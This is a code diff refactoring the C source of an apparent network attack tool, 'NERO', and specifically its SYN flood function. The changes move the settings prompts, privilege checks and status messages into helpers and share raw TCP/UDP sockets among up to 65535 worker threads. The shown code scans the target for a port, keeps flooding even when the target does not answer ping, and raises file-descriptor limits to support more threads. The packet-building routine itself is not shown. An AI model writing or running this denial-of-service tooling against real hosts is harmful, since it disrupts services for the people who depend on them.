-    const char *target_ip = (const char *)arg;
-    int cerceve_sayisi = 4;
-    struct timespec bekleme = {0, 600000000};
-    const char *dots[] = {".  ", ".. ", "...", "...."};
-
-    while (!stop_flag)
-    {
-        for (int i = 0; i < cerceve_sayisi; i++)
-        {
-            if (stop_flag) break;
-
-            pthread_mutex_lock(&ekran_mutex);
-            row = row_location_function();
-
-            printf("\033[%d;1H", row);
-            printf("\033[J");
-
-            printf("\033[40m\033[1;31m[*] \033[1;34mSYN Flood \033[0m"
-                   "\033[40m\033[1;33m%s \033[1;37mon "
-                   "\033[40m\033[1;33m%d \033[1;37m"
-                   "\033[1;32m%d \033[1;37mthread%s\033[0m\n\n",
-                    target_ip, port_select, (int)syn_thread_count, dots[i]);
-
-            fflush(stdout);
-
-            printf("%s", windows[i]);
-            fflush(stdout);
-            nanosleep(&bekleme, NULL);
-
-            pthread_mutex_unlock(&ekran_mutex);
-        }
-    }
-
-    return NULL;
-}
-
-int port_get(const char *target_ip){
+static int port_get(const char *target_ip){
     int selected = portscanner(target_ip);
     if (selected < 0) {
-        fprintf(stderr, "\n\033[49m[!]\033[0m\033[1;31m Port selection aborted.\033[0m\n");
+        nero_syn_report_port_aborted();
         return -1;
     }
     if (selected == 0) {
         /* Keep packet transmission available even when the discovery scan
          * finds no listening port: fall back to the standard HTTP port. */
         port_select = 80;
-        fprintf(stderr,
-                "\n\033[49m[!]\033[0m\033[1;31m No open port found on %s; "
-                "flooding default port 80.\033[0m\n",
-                target_ip);
+        nero_syn_report_no_open_port(target_ip);
         return 0;
     }
     port_select = selected;
-    return 0;
-}
-
-/* Verify that a raw IPv4 socket can be created before spawning the workers.
- * Without this probe a permission failure (missing root/CAP_NET_RAW) would
- * leave every worker exiting immediately while the animation thread keeps the
- * caller blocked. */
-static int raw_sockets_available(void)
-{
-    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (fd < 0) return 0;
-    close(fd);
-    fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
-    if (fd < 0) return 0;
-    close(fd);
-    return 1;
-}
-
-/* ============================================================
- * RUN-TIME SETTINGS PROMPT
- * ============================================================ */
-
-/* Input capacity: 8 digits covers the largest selectable values (65535 worker
- * threads, 4096 bytes) yet stays bounded, so a stuck keyboard repeat cannot
- * grow the line. */
-#define SYN_PROMPT_INPUT_MAX 8
-
-/* Drain a bracketed control sequence up to its final byte so a lone Escape
- * (cancel) stays distinguishable from arrow keys (ignored); same bounded
- * convention as the reader in src/cli/workload.c. */
-static int syn_prompt_consume_escape_sequence(void)
-{
-    char byte;
-    for (int index = 0; index < 32; ++index) {
-        ssize_t status = read(STDIN_FILENO, &byte, 1);
-        if (status <= 0)
-            return -1;
-        if ((unsigned char)byte >= 0x40 && (unsigned char)byte <= 0x7e)
-            return 0;
-    }
-    return -1;
-}
-
-/* Raw-mode numeric prompt with local echo: the terminal session keeps
- * ICANON and ECHO off, so this function owns the echo and backspace.
- * Enter on an empty line accepts `default_value`; an entered value must be
- * a plain digit string within [min, max] (rejected input re-prompts, never
- * clamps). Returns 0 and stores the value in *out, or -1 when the operator
- * cancelled with Esc/q/Ctrl+C or stdin closed. */
-static int syn_prompt_count(const char *prompt, long min, long max,
-                            long default_value, long *out)
-{
-    char buffer[SYN_PROMPT_INPUT_MAX];
-
-    for (;;) {
-        printf("%s (%ld-%ld, Enter = %ld): ", prompt, min, max, default_value);
-        fflush(stdout);
-
-        size_t length = 0;
-        buffer[0] = '\0';
-        int cancelled = 0;
-
-        for (;;) {
-            char byte;
-            ssize_t status = read(STDIN_FILENO, &byte, 1);
-            if (status <= 0) {  /* stdin closed: treat as cancel */
-                cancelled = 1;
-                break;
-            }
-            if (byte == '\n' || byte == '\r') {
-                putchar('\n');
-                fflush(stdout);
-                break;
-            }
-            if (byte == 27) {
-                struct pollfd input = {STDIN_FILENO, POLLIN, 0};
-                int ready = poll(&input, 1, 35);
-                if (ready > 0 && (input.revents & POLLIN) != 0) {
-                    if (syn_prompt_consume_escape_sequence() != 0) {
-                        cancelled = 1;
-                        break;
-                    }
-                    continue;  /* arrow key or similar: ignore, keep editing */
-                }
-                cancelled = 1;
-                break;
-            }
-            if (byte == 'q' || byte == 'Q' || byte == 3) {
-                cancelled = 1;
-                break;
-            }
-            if (byte == 127 || byte == '\b') {
-                if (length > 0) {
-                    --length;
-                    fputs("\b \b", stdout);
-                    fflush(stdout);
-                }
-                continue;
-            }
-            if (byte < '0' || byte > '9')
-                continue;  /* ignore every other byte, never echo it */
-            if (length + 1 >= sizeof(buffer))
-                continue;  /* bounded: extra digits make the parse fail */
-
-            buffer[length++] = byte;
-            putchar(byte);
-            fflush(stdout);
-        }
-
-        if (cancelled)
-            return -1;
-
-        /* Empty entry: keep the default. */
-        if (length == 0) {
-            *out = default_value;
-            return 0;
-        }
-
-        buffer[length] = '\0';
-        long value = 0;
-        if (nero_count_parse(buffer, min, max, &value) != 0) {
-            printf("Invalid value; enter a whole number between %ld and %ld.\n",
-                   min, max);
-            continue;
-        }
-        *out = value;
-        return 0;
-    }
-}
-
-/* Prints the measured local hardware plus the suggested worker ceiling at the
- * top of the settings prompt, so the operator sees "how high to go" before
- * choosing a count. */
-static void syn_print_hardware(const nero_hardware_info *info, long suggested)
-{
-    fputs("Hardware: ", stdout);
-    if (info->cpu_logical > 0)
-        printf("%ld logical CPU%s", info->cpu_logical,
-               info->cpu_logical == 1 ? "" : "s");
-    else
-        fputs("CPU count unavailable", stdout);
-
-    if (info->ram_total_bytes != NERO_HARDWARE_UNAVAILABLE) {
-        const unsigned long long gib = 1024ULL * 1024 * 1024;
-        printf(", %llu.%llu GiB RAM",
-               info->ram_total_bytes / gib,
-               (info->ram_total_bytes % gib) * 10 / gib);
-    } else {
-        fputs(", RAM unavailable", stdout);
-    }
-    putchar('\n');
-    printf("Suggested max worker threads: %ld\n", suggested);
-}
-
-/* Asks the operator to pick the worker count and the packet size before any
- * thread or socket for the run is created. The worker default is the local
- * hardware suggestion, but the accepted range extends to the absolute safety
- * bound so the old fixed 512 ceiling no longer applies. Returns 0 on success
- * (globals updated) or -1 when cancelled, in which case -Syn must not start. */
-static int syn_prompt_settings(void)
-{
-    nero_hardware_info info;
-    char reason[256];
-    nero_hardware_probe(&info);
-
-    long suggested =
-        nero_workload_suggested_workers(&info, reason, sizeof(reason));
-    if (suggested <= 0) {
-        suggested = NERO_SYN_THREAD_COUNT;
-        snprintf(reason, sizeof(reason),
-                 "hardware recommendation unavailable; using fallback %ld",
-                 suggested);
-    }
-    if (suggested > NERO_SYN_THREAD_HARD_MAX)
-        suggested = NERO_SYN_THREAD_HARD_MAX;
-
-    /* Each run starts from the documented defaults instead of silently
-     * carrying a previous manual entry forward. */
-    syn_thread_count = suggested;
-    syn_packet_size  = PACKET_SIZE;
-
-    fputs("\nNERO - -Syn engine settings (Enter accepts the default, "
-          "Esc cancels)\n", stdout);
-    syn_print_hardware(&info, suggested);
-    printf("Recommendation: %s\n", reason);
-    fputs("TCP leg: header-only SYN (40 B). Packet size sets the UDP "
-          "datagram size\n"
-          "(payload = packet size - 28 B of headers).\n\n", stdout);
-    fflush(stdout);
-
-    if (syn_prompt_count("Worker thread count", 1, NERO_SYN_THREAD_HARD_MAX,
-                         suggested, &syn_thread_count) != 0)
-        return -1;
-    if (syn_prompt_count("Packet size (bytes)", NERO_SYN_PACKET_SIZE_MIN,
-                         PACKET_SIZE, PACKET_SIZE, &syn_packet_size) != 0)
-        return -1;
-
-    nero_log_write(NERO_LOG_INFO, "syn",
-                   "Engine settings selected: threads=%ld packet_size=%ld",
-                   syn_thread_count, syn_packet_size);
     return 0;
 }
 
@@ -698,44 +682,14 @@ int SYN_Flood(const char *target_ip) {
     stop_flag = 0;
     atomic_init(&active_workers, 0);
 
-#if defined(__APPLE__)
-    /* Raw IPv4 sockets require root on macOS.  Report the requirement before
-     * starting any worker so the failure is actionable instead of a per-thread
-     * "Operation not permitted". */
-    if (geteuid() != 0) {
-        fprintf(stderr,
-                "\n\033[49m[!]\033[0m\033[1;31m Raw packet sockets require "
-                "root on macOS: run with sudo.\033[0m\n");
+    if (!nero_syn_preflight_privileges())
         return 1;
-    }
-#endif
-
-    if (!raw_sockets_available()) {
-        fprintf(stderr,
-                "\n\033[49m[!]\033[0m\033[1;31m Cannot open raw IPv4 sockets; "
-                "root or CAP_NET_RAW is required.\033[0m\n");
-        return 1;
-    }
 
     /* Settings are picked before the port selection and before any worker is
      * spawned; cancelling here leaves the system untouched. */
-    if (syn_prompt_settings() != 0) {
-        fprintf(stderr,
-                "\n\033[49m[!]\033[0m\033[1;31m Cancelled; -Syn not "
-                "started.\033[0m\n");
+    if (nero_syn_prompt_settings(&syn_thread_count, &syn_packet_size) != 0) {
+        nero_syn_report_cancelled();
         return 1;
-    }
-
-    /* syn_thread_count x 2 raw sockets + headroom; default RLIMIT_NOFILE is
-     * usually 1024 and would silently fail late threads. */
-    struct rlimit rl;
-    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
-        rlim_t want = (rlim_t)(syn_thread_count * 2 + 64);
-        if (rl.rlim_cur < want) {
-            rl.rlim_cur = (rl.rlim_max == RLIM_INFINITY || rl.rlim_max >= want)
-                          ? want : rl.rlim_max;
-            (void)setrlimit(RLIMIT_NOFILE, &rl);
-        }
     }
 
     if (port_get(target_ip) != 0)
@@ -749,12 +703,8 @@ int SYN_Flood(const char *target_ip) {
 
     /* Reachability is advisory: ICMP may be filtered even when the target is
      * up, so never block packet transmission because of it. */
-    if (!is_target_online(target_ip)) {
-        fprintf(stderr,
-                "\n\033[49m[!]\033[0m\033[1;33m Target %s did not answer "
-                "ping; continuing anyway.\033[0m\n",
-                target_ip);
-    }
+    if (!nero_syn_target_is_online(target_ip, &cli_termination_signal))
+        nero_syn_report_target_unreachable(target_ip);
     if (cli_termination_signal) return 1;
 
     struct sigaction previous_sa;
@@ -763,20 +713,37 @@ int SYN_Flood(const char *target_ip) {
         return 1;
     }
 
-    srand(time(NULL));
-
     /* The worker count is selected at run time, so the handle array is sized
      * per run instead of using a fixed 512-slot static array. */
     pthread_t *threads = calloc((size_t)syn_thread_count, sizeof(*threads));
     if (threads == NULL) {
-        fprintf(stderr, "Failed to allocate handles for %ld worker threads\n",
-                syn_thread_count);
+        nero_syn_report_thread_alloc_failed(syn_thread_count);
         sigaction(SIGINT, &previous_sa, NULL);
         return 1;
     }
 
-    if (pthread_create(&animasyon_thread, NULL, flood_animation, (void *)target_ip) != 0) {
-        fprintf(stderr, "Failed to create animation thread\n");
+    FloodArgs args;
+    args.target_ip = target_ip;
+    args.sock_tcp = -1;
+    args.sock_udp = -1;
+    if (open_flood_sockets(&args.sock_tcp, &args.sock_udp) != 0) {
+        free(threads);
+        sigaction(SIGINT, &previous_sa, NULL);
+        return 1;
+    }
+
+    nero_syn_animation_view view;
+    view.target_ip = target_ip;
+    view.port = port_select;
+    view.thread_count = syn_thread_count;
+    view.stop_flag = &stop_flag;
+    view.row = &row;
+
+    if (pthread_create(&animasyon_thread, NULL, nero_syn_animation_main,
+                       &view) != 0) {
+        nero_syn_report_animation_failed();
+        close(args.sock_tcp);
+        close(args.sock_udp);
         free(threads);
         sigaction(SIGINT, &previous_sa, NULL);
         return 1;
@@ -784,8 +751,8 @@ int SYN_Flood(const char *target_ip) {
 
     int threads_created = 0;
     for (int i = 0; i < (int)syn_thread_count; i++) {
-        if (pthread_create(&threads[i], NULL, flood, (void *)target_ip) != 0) {
-            fprintf(stderr, "Failed to create thread %d\n", i);
+        if (pthread_create(&threads[i], NULL, flood, &args) != 0) {
+            nero_syn_report_thread_start_failed(i);
             break;
         }
         threads_created++;
@@ -797,12 +764,13 @@ int SYN_Flood(const char *target_ip) {
         pthread_join(threads[i], NULL);
     pthread_join(animasyon_thread, NULL);
     sigaction(SIGINT, &previous_sa, NULL);
+    close(args.sock_tcp);
+    close(args.sock_udp);
     free(threads);
-    printf("[-]Thread\n");
+    nero_syn_report_stopped();
 
     if (threads_created != (int)syn_thread_count) {
-        fprintf(stderr, "Failed to start all flood threads (%d of %ld)\n",
-                threads_created, syn_thread_count);
+        nero_syn_report_incomplete(threads_created, syn_thread_count);
         return 1;
     }
 
